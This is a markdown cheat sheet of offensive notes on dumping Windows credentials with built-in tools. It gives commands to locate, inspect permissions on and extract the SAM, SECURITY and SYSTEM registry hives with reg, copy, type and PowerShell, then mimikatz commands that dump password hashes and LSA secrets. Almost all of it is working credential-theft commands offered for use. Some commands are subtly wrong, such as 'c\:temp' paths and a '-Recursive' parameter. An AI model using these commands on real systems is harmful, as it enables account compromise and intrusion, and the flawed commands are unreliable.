# Living off the Land

## 01 - Common Windows hive files locations

```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SYSTEM
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM
```

## 02 - Search hive files

### 2.1 - Command Prompt

```
C:\> dir /s /b SECURITY

C:\> dir /s /b SYSTEM

C:\> dir /s /b SAM
```

### 2.2 - Powershell

```
PS C:\> Get-ChildItem -Path C:\ -Recursive -Include SECURITY,SYSTEM,SAM
```

## 03 - Enumerate hive files

### 3.1 - Command Prompt

```
C:\> icacls C:\Windows\System32\config\SECURITY
icacls C:\Windows\System32\config\SYSTEM
icacls C:\Windows\System32\config\SAM
icacls C:\Windows\Repair\SAM
icacls C:\Windows\Repair\SYSTEM
```

If it was misconfigured that the users are allowed to access `BUILTIN\Users:(I)(RX)` to those sensitive credentials files or it could be on a particular user that was configured that allows it to access when it's the admin has the privileges.

### 3.2 - Powershell

TODO: More ways to find and enumerate in powershell

```
PS C:\> Get-ChildItem -Path C:\ -Recursive -Include SECURITY,SYSTEM,SAM | Get-ACL
```

## 04 - Extract hive files

## 4.1 - Command Prompt

#### 4.1.1 - Extract it via registry

```
C:\> reg save hklm\security c:\temp\security
reg save hklm\system c:\temp\system
reg save hklm\sam c:\temp\sam
```

#### 4.1.2 - Copy files

```
C:\> copy C:\Windows\System32\config\SAM c:\temp\sam

C:\> copy C:\Windows\System32\config\SECURITY C:\temp\security 

C:\> copy C:\Windows\System32\config\SYSTEM c:\temp\system
```

#### 4.1.3 - Output the files' contents

```
C:\> type C:\Windows\System32\config\SAM > c:\temp\sam

C:\> type C:\Windows\System32\config\SECURITY > C:\temp\security

C:\> type C:\Windows\System32\config\SYSTEM > c:\temp\system
```

## 4.2 - Powershell

#### 4.2.2 - Copy files

```
PS C:\> Copy-Item C:\Windows\System32\config\SAM c:\temp\sam

PS C:\> Copy-Item C:\Windows\System32\config\SECURITY C:\temp\security 

PS C:\> Copy-Item C:\Windows\System32\config\SYSTEM c:\temp\system
```

#### 4.2.3 - Output the files' contents

```
PS C:\> Get-Content C:\Windows\System32\config\SAM > c:\temp\sam

PS C:\> Get-Content C:\Windows\System32\config\SECURITY > C:\temp\security

PS C:\> Get-Content C:\Windows\System32\config\SYSTEM > c:\temp\system
```

## 05 - Hashdump

### 5.1 - Dumping SAM credentials with `mimikatz`

```
mimikatz # lsadump::sam /system:c\:temp\system /sam:c:\temp\sam
```

## 06 - LSASS Secrets

### 6.1 - Dumping LSASS secrets credentials with `mimikatz`

```
mimikatz # lsadump::secrets /system:c\:temp\system /security:c:\temp\security
```

---
## References

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

- [LOFLCAB: Get-ChildItem](https://lofl-project.github.io/loflcab/Cmdlets/Get-ChildItem/)

- [Red Team Notes: Dumping Hashes from SAM via Registry](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)

- [Credential Access and Credential Dumping: Dumping LSA Secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)

- [Credential Access and Credential Dumping: Dumping and Cracking MSCash Cached Domain Credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)

- [Hacking Articles: Credential Dumping SAM](https://www.hackingarticles.in/credential-dumping-sam/)